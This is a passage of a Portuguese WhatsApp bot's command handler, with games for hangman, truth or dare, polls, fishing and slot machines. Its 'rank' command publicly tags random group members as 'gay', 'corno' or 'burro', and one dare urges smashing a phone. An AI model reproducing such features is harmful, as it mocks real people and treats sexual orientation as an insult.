    { palavra: 'DATABASE', dica: 'Banco de dados em inglês' },
    { palavra: 'ANDROID', dica: 'Sistema operacional mobile' },
    { palavra: 'SERVIDOR', dica: 'Responsável por fornecer serviços na rede' },
    { palavra: 'ALGORITMO', dica: 'Sequência lógica de instruções' },
    { palavra: 'BAILEYS', dica: 'Biblioteca usada em bots WhatsApp' },
    { palavra: 'TERMINAL', dica: 'Interface de comandos' },
    { palavra: 'SCRIPT', dica: 'Código automatizado' },
    { palavra: 'COMANDO', dica: 'Instrução executada pelo sistema' },
    { palavra: 'BOTWHATSAPP', dica: 'Automação para mensageiro' },
    { palavra: 'INTELIGENCIA', dica: 'Capacidade de aprender e raciocinar' },
    { palavra: 'ARTIFICIAL', dica: 'Criada por tecnologia' },
    { palavra: 'FERRAMENTA', dica: 'Utilizada para realizar tarefas' },
    { palavra: 'SEGURANCA', dica: 'Proteção contra ameaças' },
    { palavra: 'CRIPTOGRAFIA', dica: 'Método de proteção de dados' },
    { palavra: 'FUNCIONALIDADE', dica: 'Recurso disponível em um sistema' },
    { palavra: 'DESIGNER', dica: 'Profissional que cria interfaces' },
    { palavra: 'AUTOMACAO', dica: 'Execução automática de tarefas' },
    { palavra: 'TECNOLOGIA', dica: 'Área relacionada à inovação digital' }
  ];

  const sorteio = palavras[Math.floor(Math.random() * palavras.length)];

  global.forca[from] = {
    palavra: sorteio.palavra.toUpperCase(),
    dica: sorteio.dica,
    letras: [],
    erros: [],
    vidas: 6
  };

  const jogo = global.forca[from];
  const exibida = jogo.palavra.split('').map(() => '_').join(' ');

  reply(`
🎮 *JOGO DA FORCA INICIADO*

💡 *Dica:* ${jogo.dica}
🔤 *Palavra:* ${exibida}
❤️ *Vidas:* ${jogo.vidas}

✏️ Use:
${prefix}letra A
${prefix}chutar PALAVRA
`);
}
break;

case 'letra': {
  if (!global.forca || !global.forca[from]) {
    return reply(`❌ Não tem forca ativa.\nUse: ${prefix}forca`);
  }

  const jogo = global.forca[from];
  const letra = q.toUpperCase().trim();

  if (!letra || letra.length !== 1) {
    return reply(`❌ Use assim:\n${prefix}letra A`);
  }

  if (jogo.letras.includes(letra) || jogo.erros.includes(letra)) {
    return reply(`⚠️ Essa letra já foi usada!`);
  }

  if (jogo.palavra.includes(letra)) {
    jogo.letras.push(letra);
  } else {
    jogo.erros.push(letra);
    jogo.vidas--;
  }

  const exibida = jogo.palavra
    .split('')
    .map(l => jogo.letras.includes(l) ? l : '_')
    .join(' ');

  if (!exibida.includes('_')) {
    delete global.forca[from];
    return reply(`
🏆 *PARABÉNS! VOCÊ VENCEU!*

✅ Palavra: *${jogo.palavra}*
`);
  }

  if (jogo.vidas <= 0) {
    delete global.forca[from];
    return reply(`
💀 *VOCÊ PERDEU!*

❌ A palavra era: *${jogo.palavra}*
`);
  }

  reply(`
🎮 *JOGO DA FORCA*

💡 *Dica:* ${jogo.dica}
🔤 *Palavra:* ${exibida}
❤️ *Vidas:* ${jogo.vidas}
❌ *Letras erradas:* ${jogo.erros.join(', ') || 'Nenhuma'}

✏️ Use:
${prefix}letra A
${prefix}chutar PALAVRA
`);
}
break;

case 'chutar': {
  if (!global.forca || !global.forca[from]) {
    return reply(`❌ Não tem forca ativa.\nUse: ${prefix}forca`);
  }

  const jogo = global.forca[from];
  const chute = q.toUpperCase().trim();

  if (!chute) {
    return reply(`❌ Use assim:\n${prefix}chutar Kyara`);
  }

  if (chute === jogo.palavra) {
    delete global.forca[from];
    return reply(`
🏆 *ACERTOU!*

✅ A palavra era: *${jogo.palavra}*
`);
  } else {
    jogo.vidas -= 2;

    if (jogo.vidas <= 0) {
      delete global.forca[from];
      return reply(`
💀 *VOCÊ ERROU E PERDEU!*

❌ A palavra era: *${jogo.palavra}*
`);
    }

    return reply(`
❌ *Chute errado!*

❤️ Vidas restantes: ${jogo.vidas}
`);
  }
}
break;

case 'vdb': {
const verdades = [
'Qual foi a maior mentira que você já contou?',
'Você já gostou de alguém em segredo?',
'Qual é seu maior medo?',
'Já chorou por alguém?',
'Qual foi a coisa mais vergonhosa que já fez?',
'Você já colou em uma prova?',
'Qual foi seu pior fora?',
'Já fingiu gostar de algo só para impressionar alguém?',
'Quem foi sua última paixão?',
'Qual segredo ninguém sabe sobre você?'
];

const desafios = [
'Envie um emoji aleatório para 5 contatos.',
'Grave um áudio cantando uma música.',
'Mande uma mensagem engraçada em um grupo.',
'Troque sua foto de perfil por 10 minutos.',
'Fale o alfabeto ao contrário.',
'Envie um áudio imitando um robô.',
'Escreva uma frase sem usar a letra A.',
'taque seu celular no chão gravando.',
'Envie apenas emojis na próxima mensagem.',
'Faça uma declaração para alguém do grupo.'
];

const tipo = Math.random() < 0.5 ? 'verdade' : 'desafio';

const resultado = tipo === 'verdade'
? verdades[Math.floor(Math.random() * verdades.length)]
: desafios[Math.floor(Math.random() * desafios.length)];

reply(`
🎭 *VERDADE OU DESAFIO*

🎲 Sorteado: *${tipo.toUpperCase()}*

${tipo === 'verdade' ? '❓' : '🔥'} ${resultado}

Digite *.vdb* novamente para outro.
`);
}
break;

case 'eununca': {
const frases = [
'Eu nunca beijei alguém.',
'Eu nunca menti para meus pais.',
'Eu nunca colei em uma prova.',
'Eu nunca passei vergonha em público.',
'Eu nunca chorei assistindo um filme.',
'Eu nunca escondi uma nota ruim.',
'Eu nunca mandei mensagem para a pessoa errada.',
'Eu nunca fui pego mentindo.',
'Eu nunca ri em um momento sério.',
'Eu nunca me arrependi de uma mensagem enviada.',
'Eu nunca fui parar na diretoria.',
'Eu nunca me apaixonei por um amigo.',
'Eu nunca fingi dormir para evitar conversar.',
'Eu nunca apaguei uma mensagem e fiquei com medo da reação.',
'Eu nunca derrubei comida na roupa em público.',
'Eu nunca fiquei preso no banheiro.',
'Eu nunca mandei mensagem para o contato errado.',
'Eu nunca me arrependi de um corte de cabelo.',
'Eu nunca fui ignorado por alguém que eu gostava.',
'Eu nunca perdi o ônibus por distração.',
'Eu nunca fiquei rindo sozinho lembrando de algo.',
'Eu nunca fui pego mexendo no celular escondido.',
'Eu nunca inventei uma desculpa para sair de casa.',
'Eu nunca fingi estar ocupado.',
'Eu nunca cantei errado uma música por anos.',
'Eu nunca esqueci minha própria idade por um instante.',
'Eu nunca me perdi em um lugar que conhecia.',
'Eu nunca chorei de tanto rir.',
'Eu nunca tive vergonha de pedir ajuda.',
'Eu nunca fiquei nervoso para falar com alguém.',
'Eu nunca derrubei o celular na água.',
'Eu nunca salvei alguém com um apelido estranho.',
'Eu nunca stalkeei alguém por mais de uma hora.',
'Eu nunca tirei print de uma conversa.',
'Eu nunca fui bloqueado por alguém.',
'Eu nunca bloqueei alguém por raiva.',
'Eu nunca menti minha idade na internet.',
'Eu nunca fiquei mais de 5 horas seguidas no celular.',
'Eu nunca passei vergonha tentando impressionar alguém.',
'Eu nunca me assustei com minha própria sombra.',
'Eu nunca ri em uma situação séria.',
'Eu nunca fui o último a entender uma piada.',
'Eu nunca tive um crush em personagem de filme ou série.',
'Eu nunca falei sozinho em voz alta.',
'Eu nunca tropecei andando em linha reta.',
'Eu nunca perdi uma aposta.',
'Eu nunca escondi comida para comer depois.',
'Eu nunca fiquei com ciúmes de um amigo.',
'Eu nunca dormi durante uma chamada.',
'Eu nunca me atrasei por esquecer a hora.',
'Eu nunca fiquei sem internet e não soube o que fazer.',
'Eu nunca enviei um áudio sem querer.',
'Eu nunca tive medo de assistir um filme de terror sozinho.',
'Eu nunca fingi gostar de uma música.',
'Eu nunca passei um dia inteiro de pijama.',
'Eu nunca fui confundido com outra pessoa.',
'Eu nunca me arrependi de uma postagem.',
'Eu nunca deixei uma mensagem no vácuo de propósito.',
'Eu nunca fiquei acordado até o amanhecer.',
'Eu nunca inventei uma história que saiu do controle.',
'Eu nunca fiquei com o(a) ex de um amigo.',
'Eu nunca me apaixonei por alguém comprometido.',
'Eu nunca menti para esconder com quem estava.',
'Eu nunca traí a confiança de alguém importante.',
'Eu nunca voltei para alguém que me fez sofrer.',
'Eu nunca fui o motivo do término de um casal.',
'Eu nunca fiquei com alguém apenas por aparência.',
'Eu nunca tive uma paixão secreta por um amigo.',
'Eu nunca mandei mensagem para alguém só porque estava carente.',
'Eu nunca fingi não gostar de alguém quando gostava.',
'Eu nunca tive ciúmes sem ter nada com a pessoa.',
'Eu nunca fui rejeitado e fingi que não me importei.',
'Eu nunca me arrependi de uma declaração de amor.',
'Eu nunca escondi um relacionamento.',
'Eu nunca fiquei com alguém que meus amigos desaprovavam.',
'Eu nunca fui bloqueado por alguém que eu gostava.',
'Eu nunca bloqueei alguém por raiva.',
'Eu nunca voltei a falar com alguém que jurei esquecer.',
'Eu nunca fiquei obcecado por alguém.',
'Eu nunca estraguei uma amizade por sentimentos.',
'Eu nunca me humilhei por alguém.',
'Eu nunca mandei uma mensagem e me arrependi imediatamente.',
'Eu nunca senti falta de alguém que não merecia.',
'Eu nunca tentei causar ciúmes em alguém.',
'Eu nunca perdoei algo que disse que nunca perdoaria.',
'Eu nunca fui iludido e continuei insistindo.',
'Eu nunca tive um segredo que ninguém do grupo imagina.',
'Eu nunca menti sobre meus sentimentos.',
'Eu nunca me arrependi de não ter dito algo para alguém.',
];

const frase = frases[Math.floor(Math.random() * frases.length)];

await conn.sendMessage(from, {
poll: {
name: `🍻 EU NUNCA\n\n${frase}`,
values: [
'✅ Eu já',
'❌ Eu nunca'
],
selectableCount: 1
}
});

}
break;

case 'ranking':
case 'rank': {
if (!isGroup) return reply('❌ Este comando só funciona em grupos!')

const tipos = {
  gay: '🌈 TOP 5 MAIS GAYS',
  chato: '🙄 TOP 5 MAIS CHATOS',
  corno: '🐂 TOP 5 MAIS CORNOS',
  feio: '🤢 TOP 5 MAIS FEIOS',
  burro: '🐴 TOP 5 MAIS BURROS',
  lindo: '😎 TOP 5 MAIS LINDOS',
  invejoso: '😒 TOP 5 MAIS INVEJOSOS',
  vesgo: '👀 TOP 5 MAIS VESGOS'
}

const gifs = {
  gay: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/gay.mp4",
  feio: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/feio.mp4",
  lindo: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/lindo.mp4",
  corno: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/corno.mp4",
  invejoso: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/invejoso.mp4",
  vesgo: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/vesgo.mp4",
  chato: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/chato.mp4",
  burro: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/burro.mp4"
}

const tipo = q?.toLowerCase().trim()

if (!tipos[tipo]) {
return reply(`
🏆 *RANKINGS DISPONÍVEIS*

${prefix}rank gay
${prefix}rank chato
${prefix}rank corno
${prefix}rank feio
${prefix}rank burro
${prefix}rank lindo
${prefix}rank vesgo
${prefix}rank invejoso
`)
}

const metadata = await getGroupMetadataCached(conn, from)

const participantes = metadata.participants
.map(v => v.id)
.filter(v => !v.includes(conn.user.id.split(':')[0])) // remove o bot
.sort(() => Math.random() - 0.5)
.slice(0, 5)

// Gera porcentagens e ordena do maior para o menor
const ranking = participantes.map(jid => ({
  jid,
  porcent: Math.floor(Math.random() * 100) + 1
}))

ranking.sort((a, b) => b.porcent - a.porcent)

let texto = `🏆 *${tipos[tipo]}*\n\n`
let mentions = []

for (let i = 0; i < ranking.length; i++) {
  const { jid, porcent } = ranking[i]

  const numero = jid.split('@')[0]

  mentions.push(jid)

  const medalha =
    i === 0 ? '🥇' :
    i === 1 ? '🥈' :
    i === 2 ? '🥉' :
    '🏅'

  texto += `${medalha} @${numero} ➜ ${porcent}%\n`
}

const caminhoGif = gifs[tipo]

if (caminhoGif && fs.existsSync(caminhoGif)) {
  await conn.sendMessage(from, {
    video: fs.readFileSync(caminhoGif),
    gifPlayback: true,
    caption: texto,
    mentions
  })
} else {
  await conn.sendMessage(from, {
    text: texto,
    mentions
  })
}

}
break;

const db = carregarBanco();

const user = getUserBancoId(info, sender, isGroup);
verificarConta(db, user);

case 'pescar': {
try {

const itens = [
{ nome: "🐟 Tilápia", valor: 40, chance: 35 },
{ nome: "🐠 Peixe-Palhaço", valor: 60, chance: 28 },
{ nome: "🦀 Caranguejo", valor: 50, chance: 30 },
{ nome: "🦑 Lula", valor: 75, chance: 22 },
{ nome: "🐢 Tartaruga", valor: 90, chance: 18 },
{ nome: "🐡 Baiacu", valor: 110, chance: 15 },
{ nome: "🐙 Polvo", valor: 130, chance: 12 },
{ nome: "🦞 Lagosta", valor: 150, chance: 10 },
{ nome: "🦈 Tubarão", valor: 250, chance: 6 },
{ nome: "🐚 Pérola", valor: 300, chance: 5 },
{ nome: "🦴 Osso Gigante", valor: 90, chance: 16 },
{ nome: "🧴 Garrafa Misteriosa", valor: 120, chance: 13 },
{ nome: "⚓ Âncora Pequena", valor: 200, chance: 8 },
{ nome: "🔱 Tridente Quebrado", valor: 350, chance: 4 },
{ nome: "🪙 Moeda Antiga", valor: 450, chance: 3 },
{ nome: "🪸 Coral Raro", valor: 500, chance: 2.5 },
{ nome: "📦 Baú Enferrujado", valor: 600, chance: 2 },
{ nome: "📜 Mapa do Tesouro", valor: 800, chance: 1.5 },
{ nome: "💎 Diamante Perdido", valor: 1000, chance: 0.8 },
{ nome: "👑 Coroa Afundada", valor: 1500, chance: 0.3 },
{ nome: "👢 Bota Velha", valor: 0, chance: 25 },
{ nome: "🍾 Garrafa Vazia", valor: 0, chance: 25 },
{ nome: "🛞 Pneu Velho", valor: 0, chance: 20 },
{ nome: "🗝️ Chave Enferrujada", valor: 180, chance: 8 },
{ nome: "💰 Saco de Moedas", valor: 550, chance: 2 },
{ nome: "📿 Colar Antigo", valor: 400, chance: 3 },
{ nome: "💍 Anel Perdido", valor: 700, chance: 1.5 },
{ nome: "🧭 Bússola Náutica", valor: 350, chance: 4 },
{ nome: "⚔️ Espada Enferrujada", valor: 450, chance: 2.5 },
{ nome: "🛡️ Escudo Antigo", valor: 500, chance: 2 },
{ nome: "👻 Relíquia Assombrada", valor: 1200, chance: 0.3 },
{ nome: "📕 Diário Molhado", valor: 250, chance: 6 },
{ nome: "🦐 Camarão Gigante", valor: 220, chance: 7 },
{ nome: "🐬 Golfinho Bebê", valor: 900, chance: 0.8 },
{ nome: "🦑 Lula Colossal", valor: 750, chance: 1 },
{ nome: "🐉 Escama de Dragão Marinho", valor: 3000, chance: 0.05 },
{ nome: "💀 Caveira Misteriosa", valor: 600, chance: 1.5 },
{ nome: "⚜️ Artefato Perdido", valor: 1800, chance: 0.2 },
{ nome: "🪬 Amuleto Antigo", valor: 950, chance: 0.7 },
{ nome: "🌟 Fragmento Estelar", valor: 2500, chance: 0.08 },
{ nome: "👑 Coroa do Rei Pirata", valor: 5000, chance: 0.01 },
{ nome: "🐳 Mini Baleia", valor: 1200, chance: 0.5 },
{ nome: "📦 Baú Lendário", valor: 4000, chance: 0.03 },
{ nome: "📍 Plug Anal", valor: 10000, chance: 0.03 },
{ nome: "🖱️ Mouse Pichau", valor: 4000, chance: 0.03 },
{ nome: "🏎️ BMW Abandonada", valor: 12000, chance: 0.03 }
];

function sortearItem(itens) {
let totalChance = itens.reduce((acc, item) => acc + item.chance, 0);
let random = Math.random() * totalChance;

for (let item of itens) {
random -= item.chance;
if (random <= 0) return item;
}
}

await reply(`╭━━━〔 🎣 𝐏𝐄𝐒𝐂𝐀 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 🌊 As águas do Kyara estão calmas...
┃ 🎣 Você lançou sua linha com precisão...
┃ 🫧 Bolhas surgem na superfície...
┃ ⏳ Aguardando uma captura rara...
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

await reply(`╭━━━〔 🌊 𝐏𝐄𝐒𝐂𝐀 𝐄𝐌 𝐀𝐍𝐃𝐀𝐌𝐄𝐍𝐓𝐎 〕━━━⬣
┃ 🎣 A linha afundou nas águas...
┃ 🌊 As correntes ficaram fortes...
┃ 🫧 Algo se aproxima da isca...
┃ ⚠️ Segura firme, pescador!
╰━━━〔 🎣 𝐙𝐘𝐑𝐎𝐍 𝐅𝐈𝐒𝐇𝐈𝐍𝐆 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

await reply(`╭━━━〔 🐟 𝐂𝐀𝐏𝐓𝐔𝐑𝐀 𝐃𝐄𝐓𝐄𝐂𝐓𝐀𝐃𝐀 〕━━━⬣
┃ ⚡ A isca foi atacada!
┃ 🎣 Você puxou a linha com força...
┃ 📦 Analisando as capturas...
┃ 🔎 Calculando recompensa...
╰━━━〔 🚀 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

const sorteados = Math.floor(Math.random() * 4) + 2;
let total = 0;
let capturas = {};

for (let i = 0; i < sorteados; i++) {
let item = sortearItem(itens);

if (!capturas[item.nome]) {
capturas[item.nome] = {
qtd: 0,
valor: item.valor
};
}

capturas[item.nome].qtd++;
total += item.valor;
}

const xp = Math.floor(total / 4);
const sorteDia = Math.floor(Math.random() * 100) + 1;

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0,
inventario: {},
pets: {},
pescaPendente: null,
mineracaoPendente: null,
cacaPendente: null
};
}

if (!banco[user].inventario) banco[user].inventario = {};
if (!banco[user].pets) banco[user].pets = {};
if (!banco[user].pescaPendente) banco[user].pescaPendente = null;

banco[user].xp += xp;

banco[user].pescaPendente = {
itens: capturas,
total: total,
xp: xp
};

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

let lista = '';

for (const item in capturas) {
const dados = capturas[item];
lista += `┃ 🐟 ${item} (${dados.qtd}x) • *$${dados.valor * dados.qtd}*\n`;
}

let classificacao = 'Iniciante';

const xpTotal = banco[user].xp;

if (xpTotal >= 99999999999) classificacao = 'Lenda dos Mares';
else if (xpTotal >= 1000000) classificacao = 'Pescador Elite';
else if (xpTotal >= 100000) classificacao = 'Pescador Profissional';
else if (xpTotal >= 1000) classificacao = 'Pescador Experiente';

const msgFinal = `╭━━━〔 🎣 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
${lista.trim()}
┃
┣━━━〔 💰 𝐑𝐄𝐂𝐎𝐌𝐏𝐄𝐍𝐒𝐀 〕━━━⬣
┃ 💰 Valor Total: *$${total}*
┃ ✨ Experiência: *+${xp} XP*
┃ 🎯 Capturas Realizadas: *${sorteados}*
┃
┣━━━〔 👤 𝐏𝐄𝐒𝐂𝐀𝐃𝐎𝐑 〕━━━⬣
┃ 🎣 Nome: *${pushname}*
┃ 🏅 Classificação: *${classificacao}*
┃ 🌟 Sorte do Dia: *${sorteDia}%*
┃
┣━━━〔 📦 𝐎𝐏𝐂̧𝐎̃𝐄𝐒 〕━━━⬣
┃ 📦 Guardar peixes:
┃ ${prefix}guardarpeixe
┃
┃ 💰 Vender peixes:
┃ ${prefix}venderpeixe
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 & 𝐙𝐘𝐑𝐎𝐍-𝐀𝐈 〕━━━⬣`;

reply(msgFinal);

} catch (e) {
console.log(e);
reply(`╭━━━〔 ❌ 𝐄𝐑𝐑𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ Não foi possível concluir a pesca.
┃ Tente novamente em alguns segundos.
╰━━━〔 ⚠️ 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
}
}
break;

case 'guardarpeixe': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user] || !banco[user].pescaPendente) {
return reply('❌ Você não tem pesca pendente para guardar.');
}

if (!banco[user].inventario) banco[user].inventario = {};

const pendente = banco[user].pescaPendente.itens;

for (const item in pendente) {
if (!banco[user].inventario[item]) {
banco[user].inventario[item] = {
qtd: 0,
valor: pendente[item].valor
};
}

banco[user].inventario[item].qtd += pendente[item].qtd;
}

banco[user].pescaPendente = null;

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

reply(`╭━━━〔 📦 𝐂𝐀𝐏𝐓𝐔𝐑𝐀𝐒 𝐆𝐔𝐀𝐑𝐃𝐀𝐃𝐀𝐒 〕━━━⬣
┃ ✅ Suas capturas foram guardadas com sucesso.
┃ 🎒 Inventário atualizado.
┃
┣━━━〔 📌 𝐀𝐂𝐄𝐒𝐒𝐀𝐑 〕━━━⬣
┃ 🎒 Use:
┃ ${prefix}inventario
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐅𝐈𝐒𝐇𝐈𝐍𝐆 〕━━━⬣`);

} catch (e) {
console.log(e);
reply(`╭━━━〔 ❌ 𝐄𝐑𝐑𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ Não foi possível guardar as capturas.
┃ Tente novamente.
╰━━━〔 ⚠️ 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣`);
}
}
break;

case 'venderpeixe': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user] || !banco[user].pescaPendente) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐂𝐀𝐏𝐓𝐔𝐑𝐀𝐒 〕━━━⬣
┃ Você não possui pesca pendente.
┃
┣━━━〔 🎣 𝐃𝐈𝐂𝐀 〕━━━⬣
┃ Use:
┃ ${prefix}pescar
┃
╰━━━〔 🎣 𝐙𝐘𝐑𝐎𝐍 𝐅𝐈𝐒𝐇𝐈𝐍𝐆 〕━━━⬣`);
}

const total = banco[user].pescaPendente.total;

banco[user].saldo += total;
banco[user].pescaPendente = null;

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

reply(`╭━━━〔 💰 𝐂𝐀𝐏𝐓𝐔𝐑𝐀𝐒 𝐕𝐄𝐍𝐃𝐈𝐃𝐀𝐒 〕━━━⬣
┃ ✅ Todas as capturas foram vendidas.
┃ 💰 Valor recebido: *+$${total}*
┃ 🏦 Saldo atual: *$${banco[user].saldo}*
┃
┣━━━〔 📊 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
┃ 🎣 Venda concluída com sucesso.
┃ 📈 Seu saldo foi atualizado.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

} catch (e) {
console.log(e);
reply(`╭━━━〔 ❌ 𝐄𝐑𝐑𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ Não foi possível vender as capturas.
┃ Tente novamente.
╰━━━〔 ⚠️ 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣`);
}
}
break;

case 'cassino': {
try {

const aposta = parseInt(q);

if (!q) return reply(`🎰 Digite o valor da aposta.\n\nExemplo:\n${prefix}cassino 500`);

if (isNaN(aposta) || aposta < 50) {
return reply('🎰 A aposta mínima é de $50.');
}

// banco.json

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0
};
}

if (banco[user].saldo < aposta) {
return reply(`╭━━━〔 🏦 𝐒𝐀𝐋𝐃𝐎 𝐈𝐍𝐒𝐔𝐅𝐈𝐂𝐈𝐄𝐍𝐓𝐄 〕━━━⬣
┃ ❌ Você não possui saldo suficiente.
┃
┣━━━〔 🎲 𝐀𝐏𝐎𝐒𝐓𝐀 〕━━━⬣
┃ 💸 Valor apostado: *$${aposta}*
┃ 🏦 Seu saldo: *$${banco[user].saldo}*
┃
┣━━━〔 💡 𝐃𝐈𝐂𝐀 〕━━━⬣
┃ Ganhe dinheiro usando:
┃ ${prefix}pescar
┃ ${prefix}minerar
┃ ${prefix}cacar
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣`);
}

const simbolos = [
'💎',
'💰',
'🍀',
'⭐',
'👑',
'🎲',
'💵',
'🎰'
];

function girar() {
return simbolos[Math.floor(Math.random() * simbolos.length)];
}

const a = girar();
const b = girar();
const c = girar();

await reply(`╭━━━〔 🎰 𝐂𝐀𝐒𝐒𝐈𝐍𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 🎲 Girando os rolos...
┃ 💰 Aposta: *$${aposta}*
┃ 🏦 Saldo atual: *$${banco[user].saldo}*
┃
╰━━━〔 🍀 𝐁𝐎𝐀 𝐒𝐎𝐑𝐓𝐄 〕━━━⬣`);

await new Promise(r => setTimeout(r, 2000));

await reply(`╭━━━〔 🎰 𝐑𝐎𝐋𝐎𝐒 𝐄𝐌 𝐌𝐎𝐕𝐈𝐌𝐄𝐍𝐓𝐎 〕━━━⬣
┃ 🎲 Os símbolos estão girando...
┃ ✨ O destino está sendo calculado...
┃ 🍀 Que a sorte esteja com você!
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐂𝐀𝐒𝐒𝐈𝐍𝐎 〕━━━⬣`);

await new Promise(r => setTimeout(r, 2000));

let premio = 0;
let resultado = '';

if (a === b && b === c) {
premio = aposta * 5;
resultado = '🏆 𝐉𝐀𝐂𝐊𝐏𝐎𝐓!';
banco[user].saldo += premio;
} else if (a === b || b === c || a === c) {
premio = aposta * 2;
resultado = '🎉 𝐕𝐎𝐂𝐄̂ 𝐕𝐄𝐍𝐂𝐄𝐔!';
banco[user].saldo += premio;
} else {
premio = aposta;
resultado = '💀 𝐕𝐎𝐂𝐄̂ 𝐏𝐄𝐑𝐃𝐄𝐔!';
banco[user].saldo -= aposta;
}

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

const sorteCassino = Math.floor(Math.random() * 100) + 1;

const cassino = `╭━━━〔 🎰 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃
┃        ${a} │ ${b} │ ${c}
┃
┣━━━〔 📊 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 〕━━━⬣
┃ ${resultado}
┃ 🎲 Aposta: *$${aposta}*
${
resultado.includes('𝐏𝐄𝐑𝐃𝐄𝐔')
? `┃ 📉 Prejuízo: *-$${aposta}*`
: `┃ 💰 Prêmio: *+$${premio}*`
}
┃ 🏦 Saldo atual: *$${banco[user].saldo}*
┃
┣━━━〔 👤 𝐉𝐎𝐆𝐀𝐃𝐎𝐑 〕━━━⬣
┃ 👤 Nome: *${pushname}*
┃ 🍀 Sorte: *${sorteCassino}%*
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`;

reply(cassino);

} catch (e) {
console.log(e);
reply(`╭━━━〔 ❌ 𝐄𝐑𝐑𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ Não foi possível rodar o cassino.
┃ Tente novamente.
╰━━━〔 ⚠️ 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`);
}
}
break;

case 'tigrinho':
case 'fortune':
case 'fortunetiger': {
try {

const aposta = parseInt(q);

if (!q) return reply(`🐯 Digite o valor da aposta.\n\nExemplo:\n${prefix}tigrinho 500`);

if (isNaN(aposta) || aposta < 50) {
return reply('🐯 A aposta mínima é de $50.');
}

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0
};
}

if (banco[user].saldo < aposta) {
return reply(`╭━━━〔 🐯 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
┃ ❌ Saldo insuficiente.
┃
┃ 💸 Aposta: *$${aposta}*
┃ 🏦 Saldo: *$${banco[user].saldo}*
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣`);
}

const simbolos = [
'🐯',
'🪙',
'💰',
'💎',
'🍀',
'7️⃣',
'⭐',
'👑'
];

function girar() {
return simbolos[Math.floor(Math.random() * simbolos.length)];
}

await reply(`╭━━━〔 🐯 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
┃ 🎰 Girando os rolos...
┃ 💸 Aposta: *$${aposta}*
┃ 🍀 Boa sorte!
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

await new Promise(r => setTimeout(r, 1800));

let a = girar(), b = girar(), c = girar();

await reply(`🎰 ${a} │ ❓ │ ❓`);

await new Promise(r => setTimeout(r, 1000));

await reply(`🎰 ${a} │ ${b} │ ❓`);

await new Promise(r => setTimeout(r, 1000));

let premio = 0;
let resultado = '';
let multiplicador = 0;

if (a === '🐯' && b === '🐯' && c === '🐯') {
multiplicador = 15;
